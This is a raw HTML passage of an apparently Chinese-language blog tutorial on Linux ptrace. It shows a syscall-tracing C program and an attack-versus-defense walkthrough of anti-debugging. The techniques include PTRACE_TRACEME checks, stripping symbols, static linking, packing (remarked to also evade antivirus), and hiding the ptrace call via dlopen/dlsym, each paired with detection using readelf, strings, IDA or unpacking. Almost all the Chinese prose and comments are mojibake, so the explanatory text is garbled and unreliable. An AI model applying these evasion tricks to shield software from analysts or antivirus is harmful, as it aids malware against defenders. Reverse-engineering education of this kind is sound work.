class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">    pid_t child;&#x2F;*å®šä¹‰å­è¿›ç¨‹å˜é‡*&#x2F;</span><br><span class="line">    long orig_rax;&#x2F;&#x2F;å®šä¹‰raxå¯„å­˜å™¨çš„å€¼çš„å˜é‡</span><br><span class="line">    int status;&#x2F;*å®šä¹‰è¿›ç¨‹çŠ¶æ€å˜é‡*&#x2F;</span><br><span class="line">    int iscalling &#x3D; 0;&#x2F;*åˆ¤æ–­æ˜¯å¦æ­£åœ¨è¢«è°ƒç”¨*&#x2F;</span><br><span class="line">    struct user_regs_struct regs;&#x2F;*å®šä¹‰å¯„å­˜å™¨ç»“æ„ä½“æ•°æ®ç±»å‹*&#x2F;</span><br><span class="line">    child &#x3D; fork();&#x2F;*åˆ©ç”¨forkå‡½æ•°åˆ›å»ºå­è¿›ç¨‹*&#x2F;</span><br><span class="line">    if(child &#x3D;&#x3D; 0) </span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, 0, 0);&#x2F;&#x2F;å‘é€ä¿¡å·ç»™çˆ¶è¿›ç¨‹è¡¨ç¤ºå·²åšå¥½å‡†å¤‡è¢«è·Ÿè¸ªï¼ˆè°ƒè¯•ï¼‰</span><br><span class="line">        execl(&quot;&#x2F;bin&#x2F;ls&quot;, &quot;ls&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);&#x2F;*æ‰§è¡Œå‘½ä»¤ls -l -h,æ³¨æ„ï¼Œè¿™é‡Œå‡½æ•°å‚æ•°å¿…é¡»è¦è¦ä»¥NULLç»“å°¾æ¥ç»ˆæ­¢å‚æ•°åˆ—è¡¨*&#x2F;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        while(1)</span><br><span class="line">        &#123;</span><br><span class="line">            wait(&amp;status);&#x2F;&#x2F;ç­‰å¾…å­è¿›ç¨‹å‘æ¥ä¿¡å·æˆ–è€…å­è¿›ç¨‹é€€å‡º</span><br><span class="line">            if(WIFEXITED(status))&#x2F;&#x2F;WIFEXITEDå‡½æ•°(å®)ç”¨æ¥æ£€æŸ¥å­è¿›ç¨‹æ˜¯è¢«ptraceæš‚åœçš„è¿˜æ˜¯å‡†å¤‡é€€å‡º</span><br><span class="line">            &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            orig_rax &#x3D; ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0);&#x2F;&#x2F;è·å–raxå€¼ä»è€Œåˆ¤æ–­å°†è¦æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨å·</span><br><span class="line">            if(orig_rax &#x3D;&#x3D; SYS_write)&#x2F;&#x2F;å¦‚æœç³»ç»Ÿè°ƒç”¨æ˜¯write</span><br><span class="line">            &#123;    </span><br><span class="line">                ptrace(PTRACE_GETREGS, child, 0, &amp;regs);</span><br><span class="line">                if(!iscalling)</span><br><span class="line">                &#123;</span><br><span class="line">                    iscalling &#x3D; 1;</span><br><span class="line">                    printf(&quot;SYS_write call with %lld, %lld, %lld\n&quot;,regs.rdi, regs.rsi, regs.rdx);&#x2F;&#x2F;æ‰“å°å‡ºç³»ç»Ÿè°ƒç”¨writeçš„å„ä¸ªå‚æ•°å†…å®¹</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;SYS_write call return %lld\n&quot;, regs.rax);&#x2F;&#x2F;æ‰“å°å‡ºç³»ç»Ÿè°ƒç”¨writeå‡½æ•°ç»“æœçš„è¿”å›å€¼</span><br><span class="line">                    iscalling &#x3D; 0;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, 0, 0);&#x2F;&#x2F;PTRACE_SYSCALL,å…¶ä½œç”¨æ˜¯ä½¿å†…æ ¸åœ¨å­è¿›ç¨‹è¿›å…¥å’Œé€€å‡ºç³»ç»Ÿè°ƒç”¨æ—¶éƒ½å°†å…¶æš‚åœ</span><br><span class="line">            &#x2F;&#x2F;å¾—åˆ°å¤„äºæœ¬æ¬¡è°ƒç”¨ä¹‹åä¸‹æ¬¡è°ƒç”¨ä¹‹å‰çš„çŠ¶æ€</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3010865210.png"></p><p>åœ¨è¿™ä¸ªç®€å•çš„cç¨‹åºä¸­ï¼Œæˆ‘ä»¬è·Ÿè¸ªäº†excel()å‡½æ•°çš„æ‰§è¡ŒçŠ¶æ€ï¼Œå¹¶æŠŠæ‰“å°å‡ºç›¸åº”æ‰§è¡Œä¸­çš„ä¸€äº›å¯„å­˜å™¨çš„å€¼ï¼Œè¿”å›å€¼ç­‰ï¼Œå½“ç„¶è¿™åªæ˜¯ptraceçš„éƒ¨åˆ†åŠŸèƒ½ï¼Œptraceèƒ½åšåˆ°çš„äº‹æƒ…è¿˜æœ‰æ›´å¤šï¼Œæ¯”å¦‚è¿˜èƒ½ä¿®æ”¹å†…å­˜ï¼Œä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œæ’å…¥å­—èŠ‚ç å®ç°ä¸‹æ–­ç‚¹çš„åŠŸèƒ½ã€‚</p><h3 id="2-åè°ƒè¯•"><a href="#2-åè°ƒè¯•" class="headerlink" title="2.åè°ƒè¯•"></a>2.åè°ƒè¯•</h3><p>æˆ‘ä»¬ç›´æ¥é€šè¿‡æ”»é˜²æ¥å­¦ä¹ ptraceåè°ƒè¯•çš„åº”ç”¨</p><p>1.ç›´æ¥ä½¿ç”¨ptraceå‡½æ•°ï¼š</p><p><strong>æ”»é˜²ï¼ˆé˜²ï¼‰ï¼š</strong></p><p>è¿›ç¨‹è·Ÿè¸ªå™¨ï¼Œç±»ä¼¼äºgdb watchçš„è°ƒè¯•æ–¹æ³•ï¼Œ Linux ç³»ç»Ÿgdbç­‰è°ƒè¯•å™¨ï¼Œéƒ½æ˜¯é€šè¿‡ptraceç³»ç»Ÿè°ƒç”¨å®ç°ï¼Œptraceç³»ç»Ÿè°ƒç”¨æœ‰ä¸€ä¸ªç‰¹æ€§å°±æ˜¯å½“å‰è¿›ç¨‹å·²ç»è¢«è¿½è¸ªäº†ï¼Œå°±ä¸èƒ½è¢«å…¶ä»–çˆ¶è¿›ç¨‹è¿½è¸ªï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬è®¾è®¡çš„åè°ƒè¯•ç¨‹åºå¼€å¤´å°±å…ˆæ‰§è¡Œä¸€æ¬¡<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code>ï¼Œå½“gdbå†æƒ³attachçš„æ—¶å€™å°±ä¼šå‘ç°å·²ç»æ‰§è¡Œäº†ä¸€æ¬¡ä¸èƒ½å†æ‰§è¡Œäº†ä»è€Œè¿”å›-1ï¼Œå°±æ— æ³•è°ƒè¯•äº†ã€‚</p><p>çœ‹ä¸€æ®µç®€å•çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#x3D;&#x3D;-1 )&#x2F;&#x2F;è¿™é‡Œå°±ç›´æ¥å…ˆæ‰§è¡Œäº†ptrace(PTRACE_TRACEME, 0, 0, 0)ï¼Œè¡¨ç¤ºæ­¤ç¨‹åºå·²ç»è¢«è¿½è¸ª</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace meï¼\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace meï¼\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºæ­£å¸¸çš„è¾“å‡ºç»“æœä¸ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3101929216.png"></p><p>å½“æˆ‘ä»¬ç”¨gdbè°ƒè¯•çš„æ—¶å€™ï¼Œå°†æ— æ³•è°ƒè¯•ï¼š<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1488349151.png"></p><p><strong>åè½¬ï¼šï¼ˆæ”»ï¼‰</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¥è¯†åˆ«prtaceåè°ƒè¯•ï¼Œæ£€æµ‹ç¨‹åºä¸­æ˜¯å¦å­˜åœ¨ptraceç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœæˆ‘ä»¬è¯†åˆ«åˆ°ï¼Œæˆ‘ä»¬å°±å¾ˆå®¹æ˜“é€šè¿‡IDAæˆ–è€…Binary NinjaæŠŠè°ƒç”¨prtaceåœ°æ–¹ä¿®æ”¹æˆNOPï¼Œå°±èƒ½ç»•è¿‡è¿™ç§åè°ƒè¯•ã€‚</p><p>é€šè¿‡å·¥å…·æŸ¥çœ‹ç¨‹åºæ˜¯å¦å­˜åœ¨åè°ƒè¯•ï¼Œå› ä¸ºprtaceæ˜¯å‡½æ•°çš„è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹ç¬¦å·è¡¨æ¥ç¡®å®šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">readelf -s helloword&#x2F;&#x2F;æŸ¥çœ‹.symtab</span><br><span class="line">readelf -S helloword&#x2F;&#x2F;æŸ¥çœ‹.dynsym</span><br><span class="line">objdump -T hellword&#x2F;&#x2F;æŸ¥çœ‹.dynsym</span><br><span class="line">objdump -t hellword&#x2F;&#x2F;æŸ¥çœ‹.symtab</span><br><span class="line">.......å…¶ä»–çš„æŸ¥çœ‹ç¬¦å·è¡¨å·¥å…·</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4229789843.png"></p><p><strong>åè½¬ï¼šï¼ˆé˜²ï¼‰</strong></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ é™¤ç¬¦å·è¡¨çš„é€‰é¡¹ï¼Œæ¥éšè—å¯¹ptraceçš„è°ƒç”¨ï¼Œä½†åªæ˜¯é’ˆå¯¹.sysmtabè¡¨ï¼Œä¸ä¼šå»æ‰<code>.dynsym</code></p><p>å¯ä»¥ç”¨å·¥å…·strip,ä¹Ÿå¯ä»¥åœ¨é“¾æ¥é˜¶æ®µä½¿ç”¨ä½¿ç”¨ldçš„<code>-s</code>å’Œ<code>-S</code>å‚æ•°ï¼Œä½¿å¾—è¿æ¥å™¨ç”Ÿæˆçš„è¾“å‡ºæ–‡ä»¶æ—¶å°±ä¸äº§ç”Ÿç¬¦å·ä¿¡æ¯ï¼Œ-s<code>å’Œ</code>-S<code>çš„åŒºåˆ«åœ¨äº</code>-S<code>ç§»é™¤è°ƒè¯•ç¬¦å·ä¿¡æ¯ï¼Œè€Œ</code>-sç§»é™¤æ‰€æœ‰ç¬¦å·ä¿¡æ¯ã€‚</p><p>åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨GCCä¸­é€šè¿‡<code>-Wl,-s</code>å’Œ<code>-Wl,-S</code>æ¥ç§»é™¤ç¬¦å·ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1054804442.png"></p><p>ä»å›¾å¯ä»¥çœ‹åˆ°ï¼Œå³ä½¿ä½¿ç”¨strip ç§»é™¤äº†ç¬¦å·è¡¨é¡¹ä¿¡æ¯ï¼Œä½†æ˜¯ä»ä¼šä¿ç•™.dynsymè¡¨çš„è¡¨é¡¹</p><p>.symtabå’Œdynsymï¼š</p><table><thead><tr><th>ç¬¦å·è¡¨ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>.symtab</td><td>åŒ…å«å¤§é‡çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬å…¨å±€ç¬¦å·global symbolsï¼‰</td></tr><tr><td>.dynsym</td><td>åªä¿ç•™.symtabä¸­çš„å…¨å±€ç¬¦å·</td></tr></tbody></table><p>åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå‡½æ•°ï¼Œå˜é‡éƒ½ä¸ºç¬¦å·ï¼Œè€Œç¬¦å·è¡¨é¡¹æ‰€å¯¹åº”çš„å°±æ˜¯åœ°å€ï¼ˆä¸ç‰µæ‰¯gltï¼Œgotè¡¨ï¼‰ï¼Œ.symtabå’Œ.dynsymè¿™ä¸¤ä¸ªéƒ½æ˜¯ç¬¦å·è¡¨ï¼Œdynsymæ˜¯symtabçš„è¾ƒå°ç‰ˆæœ¬ï¼Œä»…åŒ…å«å…¨å±€ç¬¦å·ï¼Œè€Œsymtabä¼šä¿æŠ¤è¿™ä¸ªç¨‹åºæ‰€æœ‰ç¬¦å·ï¼Œå› æ­¤ï¼Œä¹Ÿå¯ä»¥åœ¨symtabä¸­æ‰¾åˆ°åœ¨dynsymä¸­æ‰€æ‹¥æœ‰çš„ç¬¦å·ï¼Œä½†æ˜¯ä½ ä¼šæœ‰ä¸ªç–‘é—®:å¯æ‰§è¡Œæ–‡ä»¶æ˜æ˜åªéœ€è¦ä¸€ä¸ªsymtabå°±å¤Ÿäº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦dynsymè¡¨ï¼Ÿ</p><p>ELFæ–‡ä»¶åŒ…å«ä½¿ç”¨å®ƒä»¬çš„è¿›ç¨‹åœ¨è¿è¡Œæ—¶æ‰€éœ€çš„æŸäº›éƒ¨åˆ†ï¼ˆä¾‹å¦‚ä»£ç å’Œæ•°æ®ï¼‰ï¼Œè¿™äº›éƒ¨åˆ†è¢«æ ‡è®°ä¸ºå¿…é¡»çš„ã€‚é“¾æ¥å™¨ï¼Œè°ƒè¯•å™¨å’Œå…¶ä»–æ­¤ç±»å·¥å…·éœ€è¦å…¶ä»–è®¸å¤šéƒ¨åˆ†ï¼Œä½†æ­£åœ¨è¿è¡Œçš„ç¨‹åºä¸éœ€è¦è¿™äº›éƒ¨åˆ†ã€‚æ‰€ä»¥é“¾æ¥å™¨ç”ŸæˆELFæ–‡ä»¶æ—¶ï¼Œå®ƒå°†æ‰€æœ‰ç¨‹åºè¿è¡Œæ‰€å¿…éœ€çš„èŠ‚æ”¶é›†åˆ°æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ä¸­ï¼Œè€Œæ‰€æœ‰ç¨‹åºè¿è¡Œä¸å¿…éœ€çš„èŠ‚éƒ½æ”¾åœ¨å…¶ä»–ä½ç½®ã€‚å½“æ“ä½œç³»ç»ŸåŠ è½½ELFæ–‡ä»¶æ—¶ï¼Œåªæœ‰å¿…éœ€çš„éƒ¨åˆ†è¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œä¸éœ€è¦çš„éƒ¨åˆ†ä¿ç•™åœ¨æ–‡ä»¶ä¸­ï¼Œä¸éœ€è¦çš„éƒ¨åˆ†ä¸ä¼šæ˜ å°„åˆ°å†…å­˜ï¼Œåœ¨å†…å­˜ä¸­ä¸å¯è§ã€‚å®Œæ•´çš„ç¬¦å·è¡¨åŒ…å«é“¾æ¥æˆ–è°ƒè¯•æ–‡ä»¶æ‰€éœ€çš„å¤§é‡æ•°æ®ï¼Œè€Œè¿è¡Œæ—¶åˆ™ä¸éœ€è¦ã€‚å®é™…ä¸Šï¼Œåœ¨å¯å…±äº«åº“å’ŒåŠ¨æ€é“¾æ¥å‡ºç°ä¹‹å‰çš„æ—¥å­é‡Œï¼Œåœ¨è¿è¡Œæ—¶ä¸éœ€è¦å®ƒä»¬ï¼Œæ‰€ä»¥ä¸ºäº†èŠ‚çœè¿è¡Œå†…å­˜ï¼Œå®šä¹‰äº†ç¬¬äºŒä¸ªå¼ è¡¨ï¼Œä¸ºâ€œ dynsymâ€ã€‚</p><p>å› æ­¤ï¼ŒELFæ–‡ä»¶æœ‰ä¸¤ä¸ªç¬¦å·è¡¨ï¼ŒsymtabåŒ…å«æ‰€æœ‰å†…å®¹ï¼Œä½†æ˜¯å®ƒä¸æ˜¯ç¨‹åºè¿è¡Œå¿…éœ€çš„ï¼Œå¯ä»¥å‰¥ç¦»ï¼Œå¹¶ä¸”æ²¡æœ‰è¿è¡Œçš„å‰¯ä½œç”¨ï¼Œdynsymæ˜¯ä¸å¯å‰¥ç¦»çš„ï¼ŒåŒ…å«æ”¯æŒè¿è¡Œæ—¶æ“ä½œæ‰€éœ€çš„ç¬¦å·ã€‚</p><p>å¦‚æœæ²¡æœ‰ä½œä»»ä½•å¤„ç†ï¼Œptraceåœ¨.dynsymè¡¨ä¸­ï¼Œè¿è¡Œæ—¶è°ƒç”¨æ—¶éœ€è¦è¿›è¡Œé‡å®šä½ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åˆ é™¤dynsymè¡¨ä¸­å¯¹åº”ç¬¦å·è¡¨é¡¹ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶ï¼Œé™æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œptraceç¬¦å·å°±æ”¾åœ¨äº†symtabè¡¨ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ é™¤æ‰å¯¹åº”çš„ç¬¦å·è¡¨é¡¹äº†</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/83116522669.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/108225897.png"></p><p>æˆ‘ä»¬å†æŸ¥çœ‹çš„æ—¶å€™ï¼Œå‘ç°.symtabè¡¨æ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼é‚£ä¹ˆå°±çœŸçš„æ„å‘³ç€æˆ‘ä»¬æŠŠptraceéšè—äº†å—ï¼Ÿ</p><p><strong>åè½¬ï¼šï¼ˆæ”»ï¼‰</strong></p><p>ä½†æ˜¯æˆ‘ä»¬å¦‚æœä½¿ç”¨idaæ‰“å¼€çš„è¯ï¼Œåœ¨IDA FLIRT(åº“æ–‡ä»¶å¿«é€Ÿè¯†åˆ«ä¸é‰´å®šæŠ€æœ¯)å¸®åŠ©ä¸‹ï¼Œåªè¦æ‰¾åˆ°å¯¹åº”çš„é“¾æ¥åº“çš„ç‰ˆæœ¬ï¼Œç”Ÿæˆ.sigæ–‡ä»¶ï¼Œä¾ç„¶èƒ½å‘ç°ptraceç³»ç»Ÿè°ƒç”¨!</p><p><strong>åè½¬ï¼šï¼ˆé˜²ï¼‰</strong></p><p>å¦‚æœæˆ‘ä»¬ç»™åº”ç”¨ç¨‹åºåŠ å£³çš„è¯ï¼Œåœ¨æ²¡æœ‰è„±å£³çš„æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆIDA FLIRT(åº“æ–‡ä»¶å¿«é€Ÿè¯†åˆ«ä¸é‰´å®šæŠ€æœ¯)ä¹Ÿæ— æ³•åˆ†æå‡ºæ¥ï¼Œæ¯”å¦‚å¸¸è§çš„upxä¹‹ç±»çš„åŠ å£³ç¨‹åºï¼æœ€å¥½èƒ½åŠ ä¸€ä¸ªçŒ›å£³ï¼Œä¸ä»…èƒ½åè°ƒè¯•ï¼Œä¹Ÿèƒ½è¿‡æ€æ¯’è½¯ä»¶ï¼Œå¤šé¦™ï¼</p><p><strong>åè½¬ï¼šï¼ˆæ”»ï¼‰</strong></p><p>è¯¸å¦‚åƒupxè¿™æ ·çš„å£³ï¼Œæˆ‘ä»¬ä½¿ç”¨PEIDä¹‹ç±»çš„å·¥å…·å¯ä»¥è½»æ¾è¯†åˆ«ï¼Œè„±å£³å°±è¡Œï¼Œé™¤éç¨‹åºæœ¬èº«ä½¿ç”¨éš¾ä»¥è§£åŒ…çš„è‡ªå®šä¹‰åŠ å£³ç¨‹åºï¼Œè¿™æ ·çš„çŒ›å£³ï¼æ¯”è¾ƒéš¾è„±ã€‚</p><p><strong>åè½¬ï¼šï¼ˆé˜²ï¼‰</strong></p><p>ç”±äºé™æ€åŠ è½½è¿‡äºç¬¨é‡äº†ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶å¾ˆå¤§ï¼‰ï¼Œä¸æ˜¯é•¿ä¹…ä¹‹è®¡ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨åŠ¨æ€åŠ è½½è¿™é¡¹æŠ€æœ¯ï¼Œå°±å¯ä»¥å›åˆ°åŠ¨æ€åŠ è½½åº“æ–‡ä»¶ï¼ˆæ–‡ä»¶å¾ˆå°ï¼‰ï¼Œå¹¶ä¸”ptraceå°†ä¸ä¼šå‡ºç°åœ¨.symtabå’Œ.dynsymè¡¨ä¸­ã€‚</p><p>åŠ¨æ€åŠ è½½æ˜¯æŒ‡åœ¨è¿è¡Œæ—¶åŠ è½½åº“å¹¶æ£€ç´¢åº“å‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦dlopenåŠ è½½åº“ï¼Œdlsymè§£æå‡½æ•°åœ°å€ï¼Œä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include&lt;dlfcn.h&gt;&#x2F;&#x2F;LinuxåŠ¨æ€åº“çš„æ˜¾å¼è°ƒç”¨</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    void *handle;&#x2F;&#x2F;å®šä¹‰å¥æŸ„æŒ‡é’ˆå˜é‡</span><br><span class="line">    long (*go)(enum __ptrace_request request, pid_t pid);&#x2F;&#x2F;å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡</span><br><span class="line">    &#x2F;&#x2F;è·å–åŒ…å«&#39;ptrace&#39;çš„åº“çš„å¥æŸ„</span><br><span class="line">    handle &#x3D; dlopen (&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;å¯¹åŠ¨æ€è§£æå‡½æ•°â€œptraceâ€çš„å¼•ç”¨,goå˜é‡å­˜çš„æ˜¯ptraceçš„åœ°å€</span><br><span class="line">    go &#x3D; dlsym(handle, &quot;ptrace&quot;);</span><br><span class="line">    if (go(PTRACE_TRACEME, 0) &lt; 0) &#123;</span><br><span class="line">        puts(&quot;being traced&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;not being traced&quot;);</span><br><span class="line">    &#x2F;&#x2F;å…³é—­å¥æŸ„</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gccç¼–è¯‘æ—¶è®°å¾—åŠ ä¸Šé€‰é¡¹-ldlï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼å®é™…æ•ˆæœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/846479426.png"></p><p>æˆ‘ä»¬ä¼šå‘ç°ï¼Œæˆ‘ä»¬å®å®åœ¨åœ¨çš„æŠŠptraceéšè—ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨stripåˆ é™¤ç›¸åº”çš„ç¬¦å·è¡¨é¡¹ã€‚</p><p><strong>åè½¬ï¼šï¼ˆæ”»ï¼‰</strong></p><p>ä½†æ˜¯æˆ‘ä»¬ä½¿ç”¨idaæ‰“å¼€ä¾ç„¶ä¼šå‘ç°å­˜åœ¨å­—ç¬¦ptraceï¼Œæˆ–è€…ç›´æ¥è·³åˆ°_rodataå»æ‰¾ï¼Œå› ä¸ºptraceæ˜¯å­—ç¬¦ä¸²å¸¸é‡ï¼Œå°±æ”¾åœ¨__rodate(åªè¯»æ•°æ®æ®µ)</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1005118859.png"></p><p>æˆ–è€…ç›´æ¥ä½¿ç”¨stringså­—ç¬¦æœç´¢</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/903051067.png"></p><p><strong>åè½¬ï¼šï¼ˆé˜²ï¼‰</strong></p><p>å› ä¸ºæˆ‘ä»¬ä¸Šä¸€ä¸ªä½¿ç”¨äº†å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œå¸¸é‡ä¸å¯ä»¥æ”¹å˜ä¿®æ”¹ï¼Œä¸”æ— æ³•éšè—ï¼Œé‚£å¦‚æœæˆ‘ä»¬æŠŠptraceå®šä¹‰ä¸ºå­—ç¬¦æ•°ç»„å‹’ï¼ŸæŠŠptraceæ‹†åˆ†æˆå‡ ä¸ªå­—ç¬¦ä¸²</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include&lt;dlfcn.h&gt;&#x2F;&#x2F;LinuxåŠ¨æ€åº“çš„æ˜¾å¼è°ƒç”¨</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    void *handle;&#x2F;&#x2F;å®šä¹‰å¥æŸ„æŒ‡é’ˆå˜é‡</span><br><span class="line">    long (*go)(enum __ptrace_request request, pid_t pid);&#x2F;&#x2F;å®šä¹‰å‡½æ•°æŒ‡é’ˆå˜é‡</span><br><span class="line">    char nice[] &#x3D; &quot;ptrace&quot;;&#x2F;&#x2F;å®šä¹‰å­—ç¬¦ä¸²æ•°ç»„</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;è·å–åŒ…å«&#39;ptrace&#39;çš„åº“çš„å¥æŸ„</span><br><span class="line">    handle &#x3D; dlopen (&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;, RTLD_LAZY);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;å¯¹åŠ¨æ€è§£æå‡½æ•°â€œptraceâ€çš„å¼•ç”¨,goå˜é‡å­˜çš„æ˜¯ptraceçš„åœ°å€</span><br><span class="line">    go &#x3D; dlsym(handle, nice);</span><br><span class="line">    if (go(PTRACE_TRACEME, 0) &lt; 0) &#123;&#x2F;&#x2F;go(PTRACE_TRACEME, 0)ç›¸å½“äºptrace(PTRACE_TRACEME, 0)</span><br><span class="line">        puts(&quot;being traced&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;not being traced&quot;);</span><br><span class="line">    &#x2F;&#x2F;å…³é—­å¥æŸ„</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨stringså­—ç¬¦æœç´¢å°†æ— æ•ˆ</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2742249332.png"></p><p>ä½¿ç”¨IDAæ‰“å¼€ï¼Œä¹Ÿå¥½åƒæ²¡æœ‰æ˜æ˜¾ptraceå­—ç¬¦çš„ç‰¹å¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3385230273.png"></p><p><strong>åè½¬ï¼šï¼ˆæ”»ï¼‰</strong></p><p>å¦‚æœæˆ‘ä»¬ç”¨idaä¸­çš„åŠŸèƒ½ï¼ŒæŠŠæ±‡ç¼–ä»£ç è½¬æ¢æˆcè¯­è¨€ä¼ªä»£ç æ˜µï¼Ÿ</p><p><img 